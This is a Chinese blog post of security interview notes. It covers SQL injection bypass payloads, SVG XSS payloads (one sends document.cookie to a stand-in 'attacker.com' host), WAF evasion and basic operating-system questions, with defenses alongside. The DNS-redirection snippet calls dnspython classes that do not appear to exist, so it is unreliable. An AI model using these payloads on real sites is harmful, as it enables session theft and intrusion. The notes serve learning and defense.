href="#8-%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87%E5%8A%A8%E6%80%81Token%EF%BC%9F"><span class="toc-number">11.7.</span> <span class="toc-text">8. 怎么绕过动态Token？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87%E5%8F%8C%E5%9B%A0%E5%AD%90%E8%AE%A4%E8%AF%81%EF%BC%9F"><span class="toc-number">11.8.</span> <span class="toc-text">9. 怎么绕过双因子认证？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E6%9C%89%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">11.9.</span> <span class="toc-text">10. 内网扫描有流量检测怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%9D%A1%E4%BB%B6"><span class="toc-number">11.10.</span> <span class="toc-text">11. Redis主从复制条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-JWT%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">11.11.</span> <span class="toc-text">12. JWT攻击方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%AC%E4%B8%9C"><span class="toc-number">12.</span> <span class="toc-text">京东</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88IIS%E3%80%81Apache%E3%80%81Nginx%EF%BC%89"><span class="toc-number">12.1.</span> <span class="toc-text">文件解析漏洞（IIS、Apache、Nginx）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E7%9B%B4%E6%8E%A5RCE"><span class="toc-number">12.2.</span> <span class="toc-text">XXE直接RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9C%9C%E7%BD%90%E6%BA%AF%E6%BA%90%EF%BC%88JSONP%EF%BC%89"><span class="toc-number">12.3.</span> <span class="toc-text">蜜罐溯源（JSONP）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99-Poc-%E7%94%A8-Python-%E5%8F%8A%E5%85%B6%E5%BA%93"><span class="toc-number">12.4.</span> <span class="toc-text">写 Poc 用 Python 及其库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%BF%E9%87%8C"><span class="toc-number">13.</span> <span class="toc-text">阿里</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BF%AE%E5%A4%8D"><span class="toc-number">13.1.</span> <span class="toc-text">Java原生反序列化修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8C%BA%E5%88%AB"><span class="toc-number">13.2.</span> <span class="toc-text">Java反序列化区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Fastjson%E4%BF%AE%E5%A4%8D"><span class="toc-number">13.3.</span> <span class="toc-text">Java Fastjson修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E8%BF%91%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%8F%8A%E7%9C%8B%E6%B3%95"><span class="toc-number">13.4.</span> <span class="toc-text">最近安全事件及看法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E8%A6%81%E7%82%B9"><span class="toc-number">13.5.</span> <span class="toc-text">指纹识别要点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E7%BB%98%E5%BC%95%E6%93%8E%E5%85%B3%E9%94%AE%E5%9B%A0%E7%B4%A0"><span class="toc-number">13.6.</span> <span class="toc-text">测绘引擎关键因素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%99%BB%E5%BD%95%E6%97%A5%E5%BF%97"><span class="toc-number">13.7.</span> <span class="toc-text">查看登录日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">13.8.</span> <span class="toc-text">Windows自启动方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%87%BA%E6%9C%A8%E9%A9%AC%E8%BF%9B%E7%A8%8B"><span class="toc-number">13.9.</span> <span class="toc-text">找出木马进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%BA%94%E6%80%A5%E5%A4%84%E7%BD%AE"><span class="toc-number">13.10.</span> <span class="toc-text">挖矿木马应急处置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%99%BB%E5%BD%95%E6%97%A5%E5%BF%97-1"><span class="toc-number">13.11.</span> <span class="toc-text">查看登录日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E8%87%AA%E5%90%AF%E5%8A%A8%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">13.12.</span> <span class="toc-text">Windows自启动的方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%87%BA%E5%9B%9E%E8%BF%9EC2%E5%9C%B0%E5%9D%80%E7%9A%84%E8%BF%9B%E7%A8%8B"><span class="toc-number">13.13.</span> <span class="toc-text">找出回连C2地址的进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%A4%84%E7%BD%AE%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC"><span class="toc-number">13.14.</span> <span class="toc-text">应急处置挖矿木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5C2%E5%9F%9F%E5%90%8D"><span class="toc-number">13.15.</span> <span class="toc-text">排查C2域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E4%BF%AE%E5%A4%8D%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">13.16.</span> <span class="toc-text">XSS修复与利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log4j%E9%99%A4%E4%BA%86%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC%E5%A4%96%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">13.17.</span> <span class="toc-text">log4j除了升级版本外还有什么修复方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E4%B8%80%E4%B8%AAwebshell%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD%E4%BB%96%E6%98%AF%E5%9C%A8docker%E9%87%8C%E8%BF%98%E6%98%AF%E5%AE%9E%E6%9C%BA%E9%87%8C"><span class="toc-number">13.18.</span> <span class="toc-text">拿到一个webshell怎么判断他是在docker里还是实机里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-API%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">13.19.</span> <span class="toc-text">Docker API未授权漏洞介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%BA%E5%99%A8%E9%87%8D%E5%90%AF%E5%90%8E%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%98%E5%9C%A8%E5%90%97"><span class="toc-number">13.20.</span> <span class="toc-text">机器重启后内存马还在吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E7%B1%BB"><span class="toc-number">13.21.</span> <span class="toc-text">Tomcat内存马分类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%A6%E5%B0%8F%E6%BB%A1"><span class="toc-number">14.</span> <span class="toc-text">度小满</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E7%9A%84%E6%BA%90%E7%A0%81%E5%A4%84%E7%90%86"><span class="toc-number">14.1.</span> <span class="toc-text">加密的源码处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">14.2.</span> <span class="toc-text">PHP的危险函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88LFI%EF%BC%89"><span class="toc-number">14.3.</span> <span class="toc-text">本地文件包含（LFI）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E9%99%A4%E4%BA%86SLEEP%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">14.4.</span> <span class="toc-text">MySQL除了SLEEP的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E8%AF%BB%E6%96%87%E4%BB%B6%E7%9A%84%E6%BA%AF%E6%BA%90%EF%BC%88MySQL%E8%9C%9C%E7%BD%90%EF%BC%89"><span class="toc-number">14.5.</span> <span class="toc-text">MySQL读文件的溯源（MySQL蜜罐）</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        【工作】面试题整理 大厂常见问题2
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">g0dam</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-03-17T08:43:01.000Z" class="dt-published" itemprop="datePublished">2024-03-17</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="0x19-字节跳动实习面试复盘"><a href="#0x19-字节跳动实习面试复盘" class="headerlink" title="0x19 字节跳动实习面试复盘"></a>0x19 字节跳动实习面试复盘</h2><h3 id="1-SQL-注入：空格绕过、引号绕过"><a href="#1-SQL-注入：空格绕过、引号绕过" class="headerlink" title="1. SQL 注入：空格绕过、引号绕过"></a><strong>1. SQL 注入：空格绕过、引号绕过</strong></h3><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a><strong>空格绕过</strong></h4><p>在 SQL 注入中，空格可能被过滤或替换为其他字符（如 <code>+</code>）。可以通过以下方式绕过：</p>
<ul>
<li>使用注释符（<code>/* */</code> 或 <code>--</code>）替代空格。</li>
<li>使用 Unicode 编码（如 <code>\x20</code>）表示空格。</li>
<li>使用 SQL 函数（如 <code>CHAR(32)</code>）生成空格。</li>
</ul>
<p><strong>示例代码：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 原始注入：<span class="string">&#x27; OR 1=1 --</span></span><br><span class="line"><span class="string"># 绕过空格：</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/* */</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; OR 1=1--+</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">09</span><span class="comment">--  # 制表符替代空格</span></span><br><span class="line"><span class="string">&#x27; OR 1=1%0A--  # 换行符替代空格</span></span><br></pre></td></tr></table></figure>

<h4 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a><strong>引号绕过</strong></h4><p>如果单引号（<code>&#39;</code>）或双引号（<code>&quot;</code>）被过滤，可以通过以下方式绕过：</p>
<ul>
<li>使用字符拼接（如 <code>CONCAT</code>）。</li>
<li>使用 Unicode 编码（如 <code>CHAR(39)</code> 表示 <code>&#39;</code>）。</li>
<li>使用注释符绕过引号。</li>
</ul>
<p><strong>示例代码：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 原始注入：<span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"># 绕过引号：</span><br><span class="line"><span class="string">&#x27; OR 1=1--+</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">OR</span> <span class="number">0x31</span><span class="operator">=</span><span class="number">0x31</span><span class="comment">--  # 使用十六进制表示数字</span></span><br><span class="line"><span class="string">&#x27; OR &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a<span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27; OR (SELECT CHAR(97))=(SELECT CHAR(97))--  # 使用 CHAR 函数生成字符</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-XSS-中-SVG-的利用和修复"><a href="#2-XSS-中-SVG-的利用和修复" class="headerlink" title="2. XSS 中 SVG 的利用和修复"></a><strong>2. XSS 中 SVG 的利用和修复</strong></h3><h4 id="SVG-的利用"><a href="#SVG-的利用" class="headerlink" title="SVG 的利用"></a><strong>SVG 的利用</strong></h4><p>SVG（Scalable Vector Graphics）是一种基于 XML 的图形格式，支持嵌入 JavaScript 脚本。攻击者可以利用 SVG 文件执行 XSS 攻击。</p>
<p><strong>示例代码（攻击）：</strong></p>
<figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>另一种方式（事件属性）：</strong></p>
<figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;fetch(&#x27;https://attacker.com/log?c=&#x27;+document.cookie)&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;Click me!&#x27;)&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a><strong>修复方法</strong></h4><ol>
<li><strong>输入验证</strong>：对用户上传的 SVG 文件进行严格的内容过滤，禁止包含 <code>&lt;script&gt;</code> 标签和事件属性（如 <code>onload</code>）。</li>
<li><strong>内容安全策略（CSP）</strong>：通过 HTTP 响应头限制脚本执行。<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;none&#x27;</span><br></pre></td></tr></table></figure></li>
<li><strong>沙箱化</strong>：将 SVG 渲染在沙箱化的 iframe 中，限制其与主页面的交互。</li>
</ol>
<p><strong>修复代码示例：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Python 的 defusedxml 库解析 SVG，防止 XSS</span></span><br><span class="line"><span class="keyword">from</span> defusedxml <span class="keyword">import</span> minidom</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize_svg</span>(<span class="params">svg_data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 解析 SVG 并移除危险标签</span></span><br><span class="line">        dom = minidom.parseString(svg_data)</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> dom.getElementsByTagName(<span class="string">&#x27;script&#x27;</span>):</span><br><span class="line">            node.parentNode.removeChild(node)</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> dom.getElementsByTagName(<span class="string">&#x27;style&#x27;</span>):</span><br><span class="line">            node.parentNode.removeChild(node)</span><br><span class="line">        <span class="keyword">return</span> dom.toxml()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="3-DNS-重定向绑定"><a href="#3-DNS-重定向绑定" class="headerlink" title="3. DNS 重定向绑定"></a><strong>3. DNS 重定向绑定</strong></h3><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a><strong>攻击原理</strong></h4><p>DNS 重定向攻击通过篡改 DNS 记录，将合法域名解析到攻击者的 IP 地址，从而劫持流量。</p>
<p><strong>示例攻击流程：</strong></p>
<ol>
<li>攻击者控制 DNS 服务器或利用 DNS 缓存中毒。</li>
<li>将 <code>example.com</code> 的 A 记录指向攻击者的 IP（如 <code>192.168.1.100</code>）。</li>
<li>用户访问 <code>example.com</code> 时，流量被重定向到攻击者的服务器。</li>
</ol>
<p><strong>攻击代码（模拟 DNS 重定向）：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 dnspython 库模拟 DNS 重定向</span></span><br><span class="line"><span class="keyword">from</span> dns.server <span class="keyword">import</span> DNSServer</span><br><span class="line"><span class="keyword">from</span> dns.zone <span class="keyword">import</span> Zone</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建自定义 DNS 服务器</span></span><br><span class="line">zone = Zone(<span class="string">&#x27;example.com&#x27;</span>)</span><br><span class="line">zone.add_a_record(<span class="string">&#x27;example.com&#x27;</span>, <span class="string">&#x27;192.168.1.100&#x27;</span>)  <span class="comment"># 重定向到攻击者 IP</span></span><br><span class="line"></span><br><span class="line">server = DNSServer(zone, port=<span class="number">53</span>)</span><br><span class="line">server.start()</span><br></pre></td></tr></table></figure>

<h4 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a><strong>防御方法</strong></h4><ol>
<li><strong>使用 DNSSEC</strong>：确保 DNS 记录的完整性和真实性。</li>
<li><strong>限制 DNS 缓存时间（TTL）</strong>：减少缓存中毒的风险。</li>
<li><strong>HTTPS 严格传输安全（HSTS）</strong>：强制使用 HTTPS，防止中间人攻击。</li>
<li><strong>监控 DNS 记录</strong>：定期检查 DNS 记录的异常变化。</li>
</ol>
<p><strong>防御代码示例（HSTS 配置）：</strong></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nginx 配置 HSTS</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=31536000; includeSubDomains&quot;</span> always;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="数组和链表的优势及原因"><a href="#数组和链表的优势及原因" class="headerlink" title="数组和链表的优势及原因"></a>数组和链表的优势及原因</h3><ol>
<li><p><strong>数组</strong>：</p>
<ul>
<li><strong>优势</strong>：<ul>
<li><strong>随机访问</strong>：数组支持通过索引直接访问元素，访问时间复杂度为O(1)。</li>
<li><strong>内存连续性</strong>：数组在内存中是连续存储的，便于缓存优化和内存管理。</li>
<li><strong>高效性</strong>：在顺序访问时，数组的性能优于链表，因为内存访问更高效。</li>
</ul>
</li>
<li><strong>原因</strong>：<ul>
<li>数组的内存分配是连续的，这使得它在访问时可以利用CPU缓存，提高性能。</li>
<li>数组的索引访问机制使其在需要快速查找或更新元素时非常高效。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>链表</strong>：</p>
<ul>
<li><strong>优势</strong>：<ul>
<li><strong>动态大小</strong>：链表的大小可以动态调整，不需要预先分配固定大小的内存。</li>
<li><strong>插入和删除高效</strong>：链表在插入和删除元素时，只需调整指针，时间复杂度为O(1)（在已知位置的情况下）。</li>
</ul>
</li>
<li><strong>原因</strong>：<ul>
<li>链表的内存分配是分散的，不需要连续的内存空间，这使得它在内存不足时仍然可以扩展。</li>
<li>链表的指针机制使得插入和删除操作不需要移动大量元素，提高了效率。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="操作系统层面解释进程和线程区别"><a href="#操作系统层面解释进程和线程区别" class="headerlink" title="操作系统层面解释进程和线程区别"></a>操作系统层面解释进程和线程区别</h3><ol>
<li><p><strong>进程</strong>：</p>
<ul>
<li><strong>定义</strong>：进程是程序的一次执行实例，是资源分配的基本单位。</li>
<li><strong>特点</strong>：<ul>
<li><strong>独立性</strong>：每个进程都有独立的内存空间和资源。</li>
<li><strong>调度单位</strong>：进程是操作系统调度的基本单位。</li>
</ul>
</li>
<li><strong>原因</strong>：进程的独立性使得它在多任务处理时能够提供良好的隔离性，避免资源冲突。</li>
</ul>
</li>
<li><p><strong>线程</strong>：</p>
<ul>
<li><strong>定义</strong>：线程是进程中的一个执行单元，是CPU调度的基本单位。</li>
<li><strong>特点</strong>：<ul>
<li><strong>共享资源</strong>：线程共享进程的内存空间和资源。</li>
<li><strong>轻量级</strong>：线程的创建和切换开销较小。</li>
</ul>
</li>
<li><strong>原因</strong>：线程共享资源的特性使得它在并发编程中能够更高效地利用系统资源，减少上下文切换的开销。</li>
</ul>
</li>
</ol>
<h3 id="线程和进程通信方式以及数据安全问题"><a href="#线程和进程通信方式以及数据安全问题" class="headerlink" title="线程和进程通信方式以及数据安全问题"></a>线程和进程通信方式以及数据安全问题</h3><ol>
<li><p><strong>通信方式</strong>：</p>
<ul>
<li><strong>进程间通信（IPC）</strong>：<ul>
<li><strong>管道（Pipe）</strong>：用于父子进程之间的单向通信。</li>
<li><strong>消息队列</strong>：用于进程间传递消息。</li>
<li><strong>共享内存</strong>：进程共享一块内存区域进行数据交换。</li>
</ul>
</li>
<li><strong>线程间通信</strong>：<ul>
<li><strong>共享变量</strong>：线程通过共享变量进行通信。</li>
<li><strong>锁和条件变量</strong>：用于线程间的同步。</li>
</ul>
</li>
<li><strong>原因</strong>：进程间通信需要通过操作系统提供的机制，而线程间通信由于共享内存，可以直接通过变量进行。</li>
</ul>
</li>
<li><p><strong>数据安全问题</strong>：</p>
<ul>
<li><strong>竞争条件</strong>：多个线程同时访问共享资源可能导致数据不一致。</li>
<li><strong>死锁</strong>：多个线程或进程互相等待对方释放资源，导致系统停滞。</li>
<li><strong>原因</strong>：线程和进程的并发执行可能导致资源竞争和同步问题，需要通过锁、信号量等机制来解决。</li>
</ul>
</li>
</ol>
<h3 id="多进程和多线程的选用场景以及原因"><a href="#多进程和多线程的选用场景以及原因" class="headerlink" title="多进程和多线程的选用场景以及原因"></a>多进程和多线程的选用场景以及原因</h3><ol>
<li><p><strong>多进程</strong>：</p>
<ul>
<li><strong>适用场景</strong>：<ul>
<li><strong>资源隔离</strong>：需要隔离不同任务的资源，避免相互影响。</li>
<li><strong>计算密集型任务</strong>：需要利用多核CPU的并行计算能力。</li>
</ul>
</li>
<li><strong>原因</strong>：多进程提供了良好的隔离性，适合需要高稳定性和资源独立性的场景。</li>
</ul>
</li>
<li><p><strong>多线程</strong>：</p>
<ul>
<li><strong>适用场景</strong>：<ul>
<li><strong>I&#x2F;O密集型任务</strong>：如网络请求、文件读写等，线程可以利用等待时间进行其他任务。</li>
<li><strong>并发处理</strong>：如Web服务器处理多个客户端请求。</li>
</ul>
</li>
<li><strong>原因</strong>：多线程的轻量级特性和共享资源的机制使其在并发处理和I&#x2F;O密集型任务中表现优异。</li>
</ul>
</li>
</ol>
<h3 id="SQL注入绕过WAF的方式"><a href="#SQL注入绕过WAF的方式" class="headerlink" title="SQL注入绕过WAF的方式"></a>SQL注入绕过WAF的方式</h3><ol>
<li><p><strong>编码混淆</strong>：</p>
<ul>
<li><strong>URL编码</strong>：将SQL关键字转换为URL编码形式，如<code>%27</code>代替单引号。</li>
<li><strong>Unicode编码</strong>：使用Unicode编码绕过WAF检测。</li>
</ul>
</li>
<li><p><strong>拆分查询</strong>：</p>
<ul>
<li><strong>分段注入</strong>：将SQL查询拆分为多个部分，分别注入，最后组合成完整的查询。</li>
</ul>
</li>
<li><p><strong>协议特性</strong>：</p>
<ul>
<li><strong>利用HTTP头</strong>：将注入点放在HTTP头中，如User-Agent或Referer。</li>
<li><strong>利用Cookie</strong>：通过Cookie参数注入SQL代码。</li>
</ul>
</li>
<li><p><strong>逻辑漏洞</strong>：</p>
<ul>
<li><strong>时间盲注</strong>：利用SQL的延时函数（如<code>SLEEP</code>）判断查询结果。</li>
<li><strong>布尔盲注</strong>：通过布尔表达式判断查询结果。</li>
</ul>
</li>
<li><p><strong>绕过方式的原理</strong>：</p>
<ul>
<li><strong>编码混淆</strong>：WAF通常对编码后的字符进行检测，但可能无法识别所有编码形式。</li>
<li><strong>拆分查询</strong>：WAF可能无法识别拆分后的SQL片段。</li>
<li><strong>协议特性</strong>：WAF可能对非传统注入点（如HTTP头）检测不足。</li>
<li><strong>原因</strong>：WAF的规则集和检测机制可能存在漏洞，攻击者可以利用这些漏洞绕过检测。</li>
</ul>
</li>
</ol>
<h3 id="FUZZ绕WAF的Payload长度"><a href="#FUZZ绕WAF的Payload长度" class="headerlink" title="FUZZ绕WAF的Payload长度"></a>FUZZ绕WAF的Payload长度</h3><p>FUZZ绕WAF的Payload长度通常取决于WAF的规则和检测能力。一般来说，Payload长度可以从几十字节到几百字节不等。例如，在绕过SQL注入的场景中，Payload可能包括注释符、特殊字符和编码字符，长度可能在50-200字节之间。</p>
<h3 id="写过哪些正则及具体场景"><a href="#写过哪些正则及具体场景" class="headerlink" title="写过哪些正则及具体场景"></a>写过哪些正则及具体场景</h3><p>以下是一些常见的正则表达式及其应用场景：</p>
<ol>
<li><p><strong>验证IPv4地址</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$</span><br></pre></td></tr></table></figure>
<p><strong>应用场景</strong>：用于验证用户输入的IP地址是否符合IPv4格式。</p>
</li>
<li><p><strong>提取URL中的参数</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([a-zA-Z0-9_]+)=([^&amp;]*)(&amp;|$)</span><br></pre></td></tr></table></figure>
<p><strong>应用场景</strong>：从URL中提取参数名和参数值，例如从<code>http://example.com?id=123&amp;name=test</code>中提取<code>id=123</code>和<code>name=test</code>。</p>
</li>
<li><p><strong>检测SQL注入</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(union|select|insert|update|delete|drop|alter|create|exec|execute|xp_cmdshell|or|and|;|--|/*|*/|&#x27;|&quot;)\s+</span><br></pre></td></tr></table></figure>
<p><strong>应用场景</strong>：检测用户输入中是否包含SQL注入的关键字。</p>
</li>
<li><p><strong>验证电子邮件格式</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]&#123;2,&#125;$</span><br></pre></td></tr></table></figure>
<p><strong>应用场景</strong>：验证用户输入的电子邮件地址是否符合标准格式。</p>
</li>
</ol>
